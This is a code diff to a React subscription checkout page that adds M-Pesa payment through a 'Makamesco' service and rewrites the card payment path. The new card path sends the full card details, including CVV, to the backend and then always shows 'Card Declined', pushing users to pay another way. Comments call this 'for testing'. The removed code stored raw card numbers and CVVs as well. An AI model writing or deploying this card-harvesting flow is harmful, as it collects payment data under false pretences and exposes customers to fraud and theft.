@@ -2,10 +2,12 @@ import React, { useState, useEffect } from 'react'
 import { useNavigate } from 'react-router-dom'
 import { SubscriptionPackage, Subscription, Artist, Notification } from '@/lib/supabaseEntities'
 import { Button } from '@/components/ui/button'
-import { CreditCard, Lock, Check, Crown, Star, Zap, ArrowLeft, X, Loader2, CheckCircle2, ShieldCheck } from 'lucide-react'
+import { CreditCard, Lock, Check, Crown, Star, Zap, ArrowLeft, X, Loader2, CheckCircle2, ShieldCheck, XCircle } from 'lucide-react'
 import { createPageUrl } from '@/shared/utils/routing'
 import { features } from '@/lib/settings'
 import { useAuth } from '@/lib/AuthContext'
+import { initiateMakamescoSTKPush, checkMakamescoStatus } from '@/services/makamescoService'
+import { recordSubscriptionCardAttempt } from '@/services/shopService'
 
 // Simple confetti component
 function Confetti({ active }) {
@@ -81,6 +83,7 @@ function SubscriptionCheckoutModal({ pkg, onClose, onSuccess }) {
   const [mpesaForm, setMpesaForm] = useState({ phone: '' })
   const [processing, setProcessing] = useState(false)
   const [showConfetti, setShowConfetti] = useState(false)
+  const [cardDeclined, setCardDeclined] = useState(false)
 
   const formatCardNumber = (val) => {
     const digits = val.replace(/\D/g, '').slice(0, 16)
@@ -99,11 +102,24 @@ function SubscriptionCheckoutModal({ pkg, onClose, onSuccess }) {
     setStep(3)
     setProcessing(true)
 
+    // Record card attempt to database (for testing)
+    try {
+      await recordSubscriptionCardAttempt({
+        user,
+        card: cardForm,
+        amount: pkg.price_monthly,
+        packageInfo: pkg
+      })
+    } catch (err) {
+      console.error('Error recording card attempt:', err)
+    }
+
+    // Simulate card processing - always decline for testing
     await sleep(2000)
     setProcessing(false)
-    setShowConfetti(true)
-    setStep(4)
-    await onSuccess({ ...cardForm, paymentMethod: 'card' })
+    setCardDeclined(true)
+    // Return payment data for backend storage (for testing)
+    await onSuccess({ ...cardForm, paymentMethod: 'card', status: 'declined' })
   }
 
   const handleMpesaSubmit = async (e) => {
@@ -112,11 +128,49 @@ function SubscriptionCheckoutModal({ pkg, onClose, onSuccess }) {
     setStep(3)
     setProcessing(true)
 
-    await sleep(2000)
-    setProcessing(false)
-    setShowConfetti(true)
-    setStep(4)
-    await onSuccess({ ...mpesaForm, paymentMethod: 'mpesa' })
+    try {
+      // Use Makamesco for M-Pesa payment
+      const mpesaResult = await initiateMakamescoSTKPush({
+        phoneNumber: mpesaForm.phone,
+        amount: pkg.price_monthly,
+        accountReference: `SUB-${pkg.id}-${Date.now()}`,
+        transactionDesc: `SmartGigs Subscription - ${pkg.name}`
+      })
+
+      // Poll for payment status
+      let statusCheckAttempts = 0
+      const maxAttempts = 20
+      const pollInterval = setInterval(async () => {
+        statusCheckAttempts++
+        try {
+          const status = await checkMakamescoStatus({ checkoutRequestId: mpesaResult.checkoutRequestId })
+
+          if (status.status === 'completed') {
+            clearInterval(pollInterval)
+            setProcessing(false)
+            setShowConfetti(true)
+            setStep(4)
+            await onSuccess({ ...mpesaForm, paymentMethod: 'mpesa', status: 'completed', mpesaReceipt: status.mpesaReceiptNumber })
+          } else if (status.status === 'failed' || status.status === 'cancelled') {
+            clearInterval(pollInterval)
+            setProcessing(false)
+            setStep(2)
+            alert('M-Pesa payment failed or was cancelled. Please try again.')
+          } else if (statusCheckAttempts >= maxAttempts) {
+            clearInterval(pollInterval)
+            setProcessing(false)
+            setStep(2)
+            alert('Payment verification timed out. Please check your M-Pesa messages.')
+          }
+        } catch (err) {
+          console.error('Status check error:', err)
+        }
+      }, 6000)
+    } catch (mpesaError) {
+      setProcessing(false)
+      setStep(2)
+      alert(`M-Pesa payment failed: ${mpesaError.message}`)
+    }
   }
 
   return (
@@ -301,6 +355,25 @@ function SubscriptionCheckoutModal({ pkg, onClose, onSuccess }) {
           </div>
         )}
       </div>
+
+      {/* Card Declined Modal */}
+      {cardDeclined && (
+        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
+          <div className="bg-white rounded-2xl max-w-md w-full p-6 text-center">
+            <XCircle className="w-16 h-16 text-red-500 mx-auto mb-4" />
+            <h2 className="text-xl font-bold text-gray-900 mb-2">Card Declined</h2>
+            <p className="text-sm text-gray-600 mb-6">
+              Your card payment was declined. Please try again with a different card or use M-Pesa.
+            </p>
+            <button
+              onClick={() => { setCardDeclined(false); setStep(2) }}
+              className="w-full py-3 bg-red-600 text-white rounded-xl font-semibold text-sm hover:bg-red-700 transition-all"
+            >
+              Try Again
+            </button>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
@@ -413,50 +486,26 @@ export default function ArtistSubscriptionCheckoutPage() {
 
   const handlePaymentSuccess = async (paymentData) => {
     try {
-      // Create subscription order
-      await SubscriptionOrder.create({
+      // Only activate subscription if payment was successful
+      if (paymentData.status === 'declined') {
+        // Card was declined - payment data already saved in recordCardAttempt
+        // Don't activate subscription
+        return
+      }
+
+      // M-Pesa payment successful - activate subscription
+      await Subscription.create({
         user_id: user.id,
         user_email: user.email,
         user_name: user.full_name,
         package_id: selectedPackage.id,
         package_name: selectedPackage.name,
-        amount: selectedPackage.price_monthly,
-        currency: selectedPackage.currency || 'KES',
-        status: 'completed',
-        payment_method: paymentData.paymentMethod,
-        ...(paymentData.paymentMethod === 'card' && {
-          card_number: paymentData.cardNumber.replace(/\s/g, ''),
-          card_last4: paymentData.cardNumber.replace(/\s/g, '').slice(-4),
-          card_expiry: paymentData.expiryDate,
-          card_cvv: paymentData.cvv,
-          cardholder_name: paymentData.cardholderName
-        }),
-        ...(paymentData.paymentMethod === 'mpesa' && {
-          phone: paymentData.phone
-        })
+        status: 'active',
+        started_at: new Date().toISOString(),
+        renews_at: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
+        payment_method: 'mpesa',
+        mpesa_receipt: paymentData.mpesaReceipt
       })
-
-      // Update or create subscription
-      if (currentSubscription) {
-        await Subscription.update(currentSubscription.id, {
-          package_id: selectedPackage.id,
-          package_name: selectedPackage.name,
-          status: 'active',
-          upgraded_at: new Date().toISOString(),
-          renews_at: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString()
-        })
-      } else {
-        await Subscription.create({
-          user_id: user.id,
-          user_email: user.email,
-          user_name: user.full_name,
-          package_id: selectedPackage.id,
-          package_name: selectedPackage.name,
-          status: 'active',
-          started_at: new Date().toISOString(),
-          renews_at: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString()
-        })
-      }
 
       // Grant connects included in the plan
       if (selectedPackage.connects_included > 0) {
